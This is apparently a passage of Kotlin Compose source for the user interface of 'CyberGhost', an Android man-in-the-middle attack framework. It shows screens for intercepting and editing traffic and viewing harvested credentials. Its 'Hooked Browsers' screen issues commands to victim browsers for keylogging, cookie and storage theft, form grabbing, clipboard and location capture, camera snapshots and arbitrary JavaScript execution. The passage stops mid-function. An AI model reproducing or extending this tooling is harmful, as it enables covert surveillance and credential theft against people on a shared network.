@file:OptIn(ExperimentalLayoutApi::class, ExperimentalMaterial3Api::class)
package com.cyberghost.ui

import androidx.compose.animation.*
import androidx.compose.foundation.*
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.TextFieldValue
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.cyberghost.core.*

enum class Screen { DASHBOARD, INTERCEPT, CREDENTIALS, DEVICES, HOOKED, NETWORK, STATS, SETTINGS, ABOUT }

@Composable
fun CyberGhostApp(
    credentials: List<HarvestedCredential>,
    onClearCredentials: () -> Unit,
    interceptQueue: List<PendingIntercept>,
    packets: List<InterceptedPacket>,
    devices: List<ConnectedDevice>,
    hookedSessions: List<HookedSession>,
    mode: InterceptMode,
    isRunning: Boolean,
    events: List<C2Event>,
    networkHosts: List<NetworkHost>,
    isScanning: Boolean,
    trafficStats: TrafficStats,
    profiles: List<String>,
    certInfos: Map<String, CertInfo>,
    onModeChange: (InterceptMode) -> Unit,
    onToggle: () -> Unit,
    onForward: (String, InterceptedPacket) -> Unit,
    onDrop: (String) -> Unit,
    onCommand: (String, String, Map<String, Any?>) -> Unit,
    onExportCa: () -> Unit,
    onExportHar: () -> Unit,
    onConfigUpdate: (InjectionConfig) -> Unit,
    currentConfig: InjectionConfig,
    onScanNetwork: () -> Unit,
    onSaveProfile: (String) -> Unit,
    onLoadProfile: (String) -> Unit,
    onDeleteProfile: (String) -> Unit,
    onSetNickname: (String, String) -> Unit,
    onInspectCert: (String) -> Unit
) {
    var currentScreen by remember { mutableStateOf(Screen.DASHBOARD) }
    var searchQuery by remember { mutableStateOf("") }

    Scaffold(
        bottomBar = {
            NavigationBar(
                containerColor = CgSurface,
                contentColor = CgWhite,
                tonalElevation = 0.dp
            ) {
                NavItem(Screen.DASHBOARD, currentScreen, Icons.Filled.Dashboard, "Home") { currentScreen = it }
                NavItem(Screen.INTERCEPT, currentScreen, Icons.Filled.SwapVert, "Intercept") { currentScreen = it }
                NavItem(Screen.DEVICES, currentScreen, Icons.Filled.Devices, "Devices") { currentScreen = it }
                NavItem(Screen.CREDENTIALS, currentScreen, Icons.Filled.Key, "Creds") { currentScreen = it }
                NavItem(Screen.HOOKED, currentScreen, Icons.Filled.Phishing, "Hooked") { currentScreen = it }
                NavItem(Screen.SETTINGS, currentScreen, Icons.Filled.Settings, "More") { currentScreen = it }
            }
        }
    ) { padding ->
        Column(
            Modifier
                .fillMaxSize()
                .background(CgBg)
                .padding(padding)
        ) {
            when (currentScreen) {
                Screen.DASHBOARD -> DashboardScreen(isRunning, onToggle, devices, hookedSessions, trafficStats, packets, onExportHar) { currentScreen = it }
                Screen.INTERCEPT -> InterceptScreen(interceptQueue, packets, searchQuery, { searchQuery = it }, onForward, onDrop, onInspectCert)
                Screen.DEVICES -> DevicesScreen(devices, onSetNickname)
                Screen.HOOKED -> HookedScreen(hookedSessions, events, onCommand)
                Screen.NETWORK -> NetworkMapScreen(networkHosts, isScanning, onScanNetwork)
                Screen.STATS -> StatsScreen(trafficStats)
                Screen.CREDENTIALS -> CredentialsScreen(credentials = credentials, onClear = onClearCredentials)
                Screen.SETTINGS -> SettingsScreen(mode, onModeChange, currentConfig, onConfigUpdate, profiles, onSaveProfile, onLoadProfile, onDeleteProfile, onExportCa) { currentScreen = it }
                Screen.ABOUT -> AboutScreen()
            }
        }
    }
}

@Composable
fun RowScope.NavItem(screen: Screen, current: Screen, icon: ImageVector, label: String, onSelect: (Screen) -> Unit) {
    NavigationBarItem(
        icon = { Icon(icon, contentDescription = label, modifier = Modifier.size(22.dp)) },
        label = { Text(label, fontSize = 10.sp) },
        selected = current == screen,
        onClick = { onSelect(screen) },
        colors = NavigationBarItemDefaults.colors(
            selectedIconColor = CgGreen,
            selectedTextColor = CgGreen,
            unselectedIconColor = CgGray,
            unselectedTextColor = CgGray,
            indicatorColor = CgGreen.copy(alpha = 0.1f)
        )
    )
}

// ============================
// DASHBOARD
// ============================
@Composable
fun DashboardScreen(
    isRunning: Boolean, onToggle: () -> Unit,
    devices: List<ConnectedDevice>, hookedSessions: List<HookedSession>,
    stats: TrafficStats, packets: List<InterceptedPacket>,
    onExportHar: () -> Unit, navigateTo: (Screen) -> Unit
) {
    LazyColumn(
        Modifier.fillMaxSize().padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp)
    ) {
        // header
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Column {
                    Text("CYBERGHOST", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = CgGreen, letterSpacing = 2.sp)
                    Text("v2.0 — Active MITM Framework", fontSize = 11.sp, color = CgGray)
                }
                FilledTonalButton(
                    onClick = onToggle,
                    colors = ButtonDefaults.filledTonalButtonColors(
                        containerColor = if (isRunning) CgRed.copy(alpha = 0.2f) else CgGreen.copy(alpha = 0.2f)
                    ),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Icon(if (isRunning) Icons.Filled.Stop else Icons.Filled.PlayArrow,
                        contentDescription = null, tint = if (isRunning) CgRed else CgGreen, modifier = Modifier.size(20.dp))
                    Spacer(Modifier.width(6.dp))
                    Text(if (isRunning) "STOP" else "START", color = if (isRunning) CgRed else CgGreen, fontWeight = FontWeight.Bold)
                }
            }
        }

        // status indicator
        item {
            Card(colors = CardDefaults.cardColors(containerColor = if (isRunning) CgGreen.copy(alpha = 0.08f) else CgCard), shape = RoundedCornerShape(12.dp)) {
                Row(Modifier.fillMaxWidth().padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
                    Box(Modifier.size(10.dp).clip(CircleShape).background(if (isRunning) CgGreen else CgRed))
                    Spacer(Modifier.width(10.dp))
                    Text(if (isRunning) "All engines running — transparent intercept active" else "Engines offline — tap START to begin", fontSize = 13.sp, color = if (isRunning) CgGreen else CgGray)
                }
            }
        }

        // stat cards row
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                StatCard("Devices", "${devices.size}", CgCyan, Icons.Filled.Devices, Modifier.weight(1f)) { navigateTo(Screen.DEVICES) }
                StatCard("Hooked", "${hookedSessions.count { it.isAlive }}", CgMagenta, Icons.Filled.Phishing, Modifier.weight(1f)) { navigateTo(Screen.HOOKED) }
            }
        }
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                StatCard("Packets", "${stats.totalPackets.get()}", CgAmber, Icons.Filled.SwapVert, Modifier.weight(1f)) { navigateTo(Screen.INTERCEPT) }
                StatCard("Traffic", formatBytes(stats.totalBytes.get()), CgBlue, Icons.Filled.DataUsage, Modifier.weight(1f)) { navigateTo(Screen.STATS) }
            }
        }

        // protocol breakdown
        item {
            Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(14.dp)) {
                    Text("Protocol Breakdown", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                    Spacer(Modifier.height(10.dp))
                    ProtocolBar("HTTP", stats.protocol.httpCount, CgAmber, stats.totalPackets.get())
                    Spacer(Modifier.height(6.dp))
                    ProtocolBar("HTTPS", stats.protocol.httpsCount, CgCyan, stats.totalPackets.get())
                    Spacer(Modifier.height(6.dp))
                    ProtocolBar("DNS", stats.protocol.dnsCount, CgMagenta, stats.totalPackets.get())
                }
            }
        }

        // quick actions
        item {
            Text("Quick Actions", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgGray, modifier = Modifier.padding(top = 4.dp))
        }
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                ActionChip("Network Map", Icons.Filled.Radar, CgCyan, Modifier.weight(1f)) { navigateTo(Screen.NETWORK) }
                ActionChip("Stats", Icons.Filled.BarChart, CgAmber, Modifier.weight(1f)) { navigateTo(Screen.STATS) }
                ActionChip("Export", Icons.Filled.FileDownload, CgBlue, Modifier.weight(1f), onExportHar)
            }
        }
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                ActionChip("Settings", Icons.Filled.Tune, CgGray, Modifier.weight(1f)) { navigateTo(Screen.SETTINGS) }
                ActionChip("About", Icons.Filled.Info, CgDimGreen, Modifier.weight(1f)) { navigateTo(Screen.ABOUT) }
                Spacer(Modifier.weight(1f))
            }
        }

        // recent packets
        if (packets.isNotEmpty()) {
            item {
                Text("Recent Activity", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgGray, modifier = Modifier.padding(top = 4.dp))
            }
            items(packets.takeLast(5).reversed()) { pkt ->
                CompactPacketRow(pkt)
            }
        }
    }
}

@Composable
fun StatCard(label: String, value: String, color: Color, icon: ImageVector, modifier: Modifier = Modifier, onClick: () -> Unit = {}) {
    Card(modifier = modifier.clickable(onClick = onClick), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
        Row(Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
            Box(Modifier.size(36.dp).clip(RoundedCornerShape(8.dp)).background(color.copy(alpha = 0.15f)), contentAlignment = Alignment.Center) {
                Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(18.dp))
            }
            Spacer(Modifier.width(10.dp))
            Column {
                Text(value, fontSize = 18.sp, fontWeight = FontWeight.Bold, color = color)
                Text(label, fontSize = 10.sp, color = CgGray)
            }
        }
    }
}

@Composable
fun ProtocolBar(label: String, count: Long, color: Color, total: Long) {
    val fraction = if (total > 0) count.toFloat() / total else 0f
    Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
        Text(label, fontSize = 11.sp, color = CgGray, modifier = Modifier.width(48.dp))
        Box(Modifier.weight(1f).height(8.dp).clip(RoundedCornerShape(4.dp)).background(CgBg)) {
            Box(Modifier.fillMaxHeight().fillMaxWidth(fraction).clip(RoundedCornerShape(4.dp)).background(color))
        }
        Spacer(Modifier.width(8.dp))
        Text("$count", fontSize = 11.sp, color = color, modifier = Modifier.width(40.dp))
    }
}

@Composable
fun ActionChip(label: String, icon: ImageVector, color: Color, modifier: Modifier = Modifier, onClick: () -> Unit) {
    Card(modifier = modifier.clickable(onClick = onClick), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
        Row(Modifier.padding(horizontal = 12.dp, vertical = 10.dp), verticalAlignment = Alignment.CenterVertically) {
            Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(16.dp))
            Spacer(Modifier.width(6.dp))
            Text(label, fontSize = 11.sp, color = CgWhite)
        }
    }
}

@Composable
fun CompactPacketRow(pkt: InterceptedPacket) {
    val color = when { pkt.protocol == "HTTPS" -> CgCyan; pkt.isRequest -> CgAmber; else -> CgDimGreen }
    Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(8.dp), modifier = Modifier.fillMaxWidth().padding(vertical = 2.dp)) {
        Row(Modifier.padding(10.dp), verticalAlignment = Alignment.CenterVertically) {
            Box(Modifier.size(6.dp).clip(CircleShape).background(color))
            Spacer(Modifier.width(8.dp))
            Text("${pkt.method ?: ""} ", fontSize = 11.sp, color = color, fontWeight = FontWeight.Bold)
            Text("${pkt.host}${pkt.path.take(30)}", fontSize = 11.sp, color = CgWhite.copy(alpha = 0.7f), maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
            Text(pkt.protocol, fontSize = 9.sp, color = color.copy(alpha = 0.6f))
        }
    }
}

// ============================
// INTERCEPT SCREEN
// ============================
@Composable
fun InterceptScreen(
    queue: List<PendingIntercept>, history: List<InterceptedPacket>,
    searchQuery: String, onSearchChange: (String) -> Unit,
    onForward: (String, InterceptedPacket) -> Unit, onDrop: (String) -> Unit,
    onInspectCert: (String) -> Unit
) {
    Column(Modifier.fillMaxSize()) {
        // search bar
        OutlinedTextField(
            value = searchQuery, onValueChange = onSearchChange,
            placeholder = { Text("Filter by host, method, path...", fontSize = 12.sp) },
            leadingIcon = { Icon(Icons.Filled.Search, contentDescription = null, tint = CgGray, modifier = Modifier.size(18.dp)) },
            modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 8.dp).height(48.dp),
            textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = CgWhite),
            singleLine = true,
            shape = RoundedCornerShape(10.dp),
            colors = OutlinedTextFieldDefaults.colors(
                unfocusedBorderColor = CgGray.copy(alpha = 0.3f),
                focusedBorderColor = CgGreen,
                unfocusedContainerColor = CgCard,
                focusedContainerColor = CgCard
            )
        )

        val filtered = if (searchQuery.isBlank()) history else {
            history.filter { pkt ->
                val q = searchQuery.lowercase()
                pkt.host.lowercase().contains(q) || (pkt.method ?: "").lowercase().contains(q) || pkt.path.lowercase().contains(q) || pkt.protocol.lowercase().contains(q)
            }
        }

        LazyColumn(Modifier.fillMaxSize().padding(horizontal = 12.dp)) {
            if (queue.isNotEmpty()) {
                item { SectionHeader("Pending (${queue.size})", CgAmber) }
                items(queue) { pending ->
                    InterceptCard(pending.packet, true, { onForward(pending.packet.id, it) }, { onDrop(pending.packet.id) })
                }
            }
            item { SectionHeader("History (${filtered.size})", CgDimGreen) }
            items(filtered.takeLast(300).reversed()) { pkt ->
                PacketRow(pkt) { onInspectCert(pkt.host) }
            }
        }
    }
}

@Composable
fun SectionHeader(text: String, color: Color) {
    Text(text, fontSize = 11.sp, fontWeight = FontWeight.Bold, color = color, modifier = Modifier.padding(vertical = 6.dp, horizontal = 4.dp))
}

@Composable
fun InterceptCard(packet: InterceptedPacket, isPending: Boolean, onForward: (InterceptedPacket) -> Unit, onDrop: () -> Unit) {
    var editedBody by remember { mutableStateOf(TextFieldValue(String(packet.body))) }
    var editedPath by remember { mutableStateOf(TextFieldValue(packet.path)) }
    var expanded by remember { mutableStateOf(false) }
    val color = if (packet.isRequest) CgCyan else CgAmber

    Card(Modifier.fillMaxWidth().padding(vertical = 3.dp).clickable { expanded = !expanded }, colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
        Column(Modifier.padding(12.dp)) {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(Modifier.size(6.dp).clip(CircleShape).background(color))
                    Spacer(Modifier.width(6.dp))
                    Text("${packet.direction.name} ${packet.protocol}", fontSize = 11.sp, color = color, fontWeight = FontWeight.Bold)
                }
                Text(packet.sourceIp, fontSize = 10.sp, color = CgGray)
            }
            Spacer(Modifier.height(4.dp))
            Text("${packet.method ?: ""} ${packet.host}${packet.path.take(50)}", fontSize = 11.sp, color = CgWhite, maxLines = if (expanded) 5 else 1, overflow = TextOverflow.Ellipsis)

            if (expanded && isPending) {
                Spacer(Modifier.height(8.dp))
                OutlinedTextField(value = editedPath, onValueChange = { editedPath = it }, label = { Text("Path", fontSize = 10.sp) },
                    textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite, fontFamily = FontFamily.Monospace),
                    modifier = Modifier.fillMaxWidth(), singleLine = true, shape = RoundedCornerShape(8.dp),
                    colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgCyan))
                Spacer(Modifier.height(6.dp))
                OutlinedTextField(value = editedBody, onValueChange = { editedBody = it }, label = { Text("Body", fontSize = 10.sp) },
                    textStyle = androidx.compose.ui.text.TextStyle(fontSize = 10.sp, color = CgDimGreen, fontFamily = FontFamily.Monospace),
                    modifier = Modifier.fillMaxWidth().heightIn(min = 60.dp, max = 150.dp), shape = RoundedCornerShape(8.dp),
                    colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgCyan))
                Spacer(Modifier.height(8.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { onForward(packet.copy(path = editedPath.text, body = editedBody.text.toByteArray())) },
                        colors = ButtonDefaults.buttonColors(containerColor = CgGreen.copy(0.2f)), shape = RoundedCornerShape(8.dp)) {
                        Text("Forward", color = CgGreen, fontSize = 12.sp)
                    }
                    Button(onClick = onDrop, colors = ButtonDefaults.buttonColors(containerColor = CgRed.copy(0.2f)), shape = RoundedCornerShape(8.dp)) {
                        Text("Drop", color = CgRed, fontSize = 12.sp)
                    }
                }
            }
        }
    }
}

@Composable
fun PacketRow(pkt: InterceptedPacket, onTapHost: () -> Unit) {
    val color = when { pkt.protocol == "HTTPS" -> CgCyan; pkt.isRequest -> CgAmber; else -> CgDimGreen }
    var expanded by remember { mutableStateOf(false) }

    Card(Modifier.fillMaxWidth().padding(vertical = 2.dp).clickable { expanded = !expanded },
        colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(8.dp)) {
        Column(Modifier.padding(10.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(Modifier.size(6.dp).clip(CircleShape).background(color))
                Spacer(Modifier.width(6.dp))
                Text("${pkt.method ?: ""}", fontSize = 11.sp, color = color, fontWeight = FontWeight.Bold)
                Spacer(Modifier.width(4.dp))
                Text(pkt.host, fontSize = 11.sp, color = CgWhite.copy(0.8f), modifier = Modifier.clickable(onClick = onTapHost), maxLines = 1)
                Text(pkt.path.take(25), fontSize = 11.sp, color = CgGray, maxLines = 1, modifier = Modifier.weight(1f), overflow = TextOverflow.Ellipsis)
                pkt.statusCode?.let { Text("$it", fontSize = 10.sp, color = if (it < 400) CgDimGreen else CgRed) }
            }
            if (expanded) {
                Spacer(Modifier.height(6.dp))
                pkt.headers.entries.take(6).forEach { (k, v) ->
                    Text("$k: ${v.take(60)}", fontSize = 9.sp, color = CgGray, fontFamily = FontFamily.Monospace, maxLines = 1, overflow = TextOverflow.Ellipsis)
                }
                if (pkt.body.isNotEmpty()) {
                    Spacer(Modifier.height(4.dp))
                    Text(String(pkt.body).take(200), fontSize = 9.sp, color = CgDimGreen, fontFamily = FontFamily.Monospace, maxLines = 4, overflow = TextOverflow.Ellipsis)
                }
            }
        }
    }
}

// ============================
// DEVICES SCREEN
// ============================
@Composable
fun DevicesScreen(devices: List<ConnectedDevice>, onSetNickname: (String, String) -> Unit) {
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
        item { Text("Connected Devices", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite) }
        item { Text("${devices.size} devices on network", fontSize = 12.sp, color = CgGray, modifier = Modifier.padding(bottom = 4.dp)) }
        items(devices) { device ->
            DeviceCard(device, onSetNickname)
        }
    }
}

@Composable
fun DeviceCard(device: ConnectedDevice, onSetNickname: (String, String) -> Unit) {
    var showNickname by remember { mutableStateOf(false) }
    var nickname by remember { mutableStateOf(TextFieldValue(device.hostname ?: "")) }

    Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
        Column(Modifier.padding(14.dp)) {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(Modifier.size(40.dp).clip(RoundedCornerShape(10.dp)).background(if (device.isHooked) CgMagenta.copy(0.15f) else CgCyan.copy(0.1f)), contentAlignment = Alignment.Center) {
                        Icon(Icons.Filled.PhoneAndroid, contentDescription = null, tint = if (device.isHooked) CgMagenta else CgCyan, modifier = Modifier.size(20.dp))
                    }
                    Spacer(Modifier.width(12.dp))
                    Column {
                        Text(device.hostname ?: device.ip, fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                        Text(device.ip, fontSize = 11.sp, color = CgGray)
                    }
                }
                if (device.isHooked) {
                    Badge(containerColor = CgMagenta) { Text("HOOKED", fontSize = 8.sp, color = CgBg, modifier = Modifier.padding(horizontal = 4.dp)) }
                }
            }
            Spacer(Modifier.height(8.dp))
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                Column {
                    Text("Requests: ${device.requestCount}", fontSize = 10.sp, color = CgGray)
                    Text("Traffic: ${formatBytes(device.bytesTransferred)}", fontSize = 10.sp, color = CgGray)
                }
                Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                    IconButton(onClick = { showNickname = !showNickname }, modifier = Modifier.size(28.dp)) {
                        Icon(Icons.Filled.Edit, contentDescription = "Nickname", tint = CgGray, modifier = Modifier.size(14.dp))
                    }
                }
            }
            device.userAgent?.let {
                Text(it.take(60), fontSize = 9.sp, color = CgGray.copy(0.7f), maxLines = 1, overflow = TextOverflow.Ellipsis)
            }
            if (showNickname) {
                Spacer(Modifier.height(6.dp))
                Row(verticalAlignment = Alignment.CenterVertically) {
                    OutlinedTextField(value = nickname, onValueChange = { nickname = it }, placeholder = { Text("Nickname", fontSize = 11.sp) },
                        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite), modifier = Modifier.weight(1f).height(42.dp),
                        singleLine = true, shape = RoundedCornerShape(8.dp),
                        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
                    Spacer(Modifier.width(6.dp))
                    IconButton(onClick = { onSetNickname(device.ip, nickname.text); showNickname = false }, modifier = Modifier.size(28.dp)) {
                        Icon(Icons.Filled.Check, contentDescription = null, tint = CgGreen, modifier = Modifier.size(16.dp))
                    }
                }
            }
        }
    }
}

// ============================
// HOOKED SCREEN
// ============================
@Composable
fun HookedScreen(sessions: List<HookedSession>, events: List<C2Event>, onCommand: (String, String, Map<String, Any?>) -> Unit) {
    var selectedSession by remember { mutableStateOf<String?>(null) }
    var jsInput by remember { mutableStateOf(TextFieldValue("")) }

    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
        item { Text("Hooked Browsers", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite) }
        item { Text("${sessions.count { it.isAlive }} active sessions", fontSize = 12.sp, color = CgGray) }

        items(sessions.filter { it.isAlive }) { session ->
            Card(Modifier.fillMaxWidth().clickable { selectedSession = if (selectedSession == session.sessionId) null else session.sessionId },
                colors = CardDefaults.cardColors(containerColor = if (selectedSession == session.sessionId) CgMagenta.copy(0.08f) else CgCard), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(14.dp)) {
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                        Column(Modifier.weight(1f)) {
                            Text(session.pageUrl.take(50), fontSize = 12.sp, color = CgCyan, fontWeight = FontWeight.SemiBold, maxLines = 1, overflow = TextOverflow.Ellipsis)
                            Text("${session.platform} · ${session.screenSize}", fontSize = 10.sp, color = CgGray)
                        }
                        Badge(containerColor = CgGreen) { Text("LIVE", fontSize = 8.sp, color = CgBg, modifier = Modifier.padding(horizontal = 4.dp)) }
                    }

                    if (selectedSession == session.sessionId) {
                        Spacer(Modifier.height(10.dp))
                        FlowRow(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                            CmdChip("Screenshot", CgCyan) { onCommand(session.sessionId, "screenshot", emptyMap()) }
                            CmdChip("Keylog ON", CgMagenta) { onCommand(session.sessionId, "keylog_start", emptyMap()) }
                            CmdChip("Keylog OFF", CgGray) { onCommand(session.sessionId, "keylog_stop", emptyMap()) }
                            CmdChip("Cookies", CgAmber) { onCommand(session.sessionId, "get_cookies", emptyMap()) }
                            CmdChip("Storage", CgAmber) { onCommand(session.sessionId, "get_storage", emptyMap()) }
                            CmdChip("Forms", CgRed) { onCommand(session.sessionId, "form_grab", emptyMap()) }
                            CmdChip("Clipboard", CgDimGreen) { onCommand(session.sessionId, "get_clipboard", emptyMap()) }
                            CmdChip("Location", CgBlue) { onCommand(session.sessionId, "get_location", emptyMap()) }
                            CmdChip("Camera", CgRed) { onCommand(session.sessionId, "camera_snap", emptyMap()) }
                            CmdChip("DOM", CgGray) { onCommand(session.sessionId, "get_dom", emptyMap()) }
                        }
                        Spacer(Modifier.height(8.dp))
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            OutlinedTextField(value = jsInput, onValueChange = { jsInput = it },
                                placeholder = { Text("Execute JavaScript...", fontSize = 11.sp) },
                                textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgGreen, fontFamily = FontFamily.Monospace),
                                modifier = Modifier.weight(1f).height(42.dp), singleLine = true, shape = RoundedCornerShape(8.dp),
                                colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
                            Spacer(Modifier.width(6.dp))
                            FilledIconButton(onClick = { onCommand(session.sessionId, "exec_js", mapOf("code" to jsInput.text)); jsInput = TextFieldValue("") },
                                colors = IconButtonDefaults.filledIconButtonColors(containerColor = CgGreen.copy(0.2f)), modifier = Modifier.size(42.dp)) {
                                Icon(Icons.Filled.PlayArrow, contentDescription = null, tint = CgGreen, modifier = Modifier.size(18.dp))
                            }
                        }
                        // recent events
                        Spacer(Modifier.height(6.dp))
                        events.filter { it.sessionId == session.sessionId }.takeLast(5).reversed().forEach { event ->
                            Text("${event.type}: ${event.data.entries.take(2).joinToString { "${it.key}=${it.value.toString().take(25)}" }}",
                                fontSize = 9.sp, color = CgDimGreen, maxLines = 1, overflow = TextOverflow.Ellipsis)
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun CmdChip(label: String, color: Color, onClick: () -> Unit) {
    SuggestionChip(
        onClick = onClick,
        label = { Text(label, fontSize = 10.sp, color = color) },
        shape = RoundedCornerShape(8.dp),
        border = SuggestionChipDefaults.suggestionChipBorder(enabled = true, borderColor = color.copy(0.3f)),
        colors = SuggestionChipDefaults.suggestionChipColors(containerColor = color.copy(0.08f))
    )
}

// ============================
// NETWORK MAP SCREEN
// ============================
@Composable
fun NetworkMapScreen(hosts: List<NetworkHost>, isScanning: Boolean, onScan: () -> Unit) {
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Column {
                    Text("Network Map", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                    Text("${hosts.size} hosts discovered", fontSize = 12.sp, color = CgGray)
                }
                Button(onClick = onScan, enabled = !isScanning, colors = ButtonDefaults.buttonColors(containerColor = CgCyan.copy(0.2f)), shape = RoundedCornerShape(10.dp)) {
                    if (isScanning) CircularProgressIndicator(modifier = Modifier.size(16.dp), color = CgCyan, strokeWidth = 2.dp)
                    else Icon(Icons.Filled.Radar, contentDescription = null, tint = CgCyan, modifier = Modifier.size(16.dp))
                    Spacer(Modifier.width(6.dp))
                    Text(if (isScanning) "Scanning..." else "Scan", color = CgCyan, fontSize = 12.sp)
                }
            }
        }
        items(hosts) { host ->
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
                Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                    Box(Modifier.size(36.dp).clip(RoundedCornerShape(8.dp)).background(
                        if (host.isGateway) CgGreen.copy(0.15f) else CgCyan.copy(0.1f)
                    ), contentAlignment = Alignment.Center) {
                        Icon(if (host.isGateway) Icons.Filled.Router else Icons.Filled.PhoneAndroid,
                            contentDescription = null, tint = if (host.isGateway) CgGreen else CgCyan, modifier = Modifier.size(18.dp))
                    }
                    Spacer(Modifier.width(12.dp))
                    Column(Modifier.weight(1f)) {
                        Text(host.hostname ?: host.ip, fontSize = 13.sp, fontWeight = FontWeight.Medium, color = CgWhite)
                        Text(host.ip, fontSize = 11.sp, color = CgGray)
                        host.mac?.let { Text(it, fontSize = 10.sp, color = CgGray.copy(0.6f)) }
                    }
                    host.vendor?.let {
                        Badge(containerColor = CgCyan.copy(0.15f)) { Text(it, fontSize = 8.sp, color = CgCyan, modifier = Modifier.padding(horizontal = 4.dp)) }
                    }
                }
            }
        }
    }
}

// ============================
// STATS SCREEN
// ============================
@Composable
fun StatsScreen(stats: TrafficStats) {
    val topDomains = remember(stats.totalPackets.get()) { stats.topDomains() }
    val bwHistory by stats.bandwidthHistory.collectAsState()

    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
        item { Text("Traffic Statistics", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite) }

        // overview cards
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
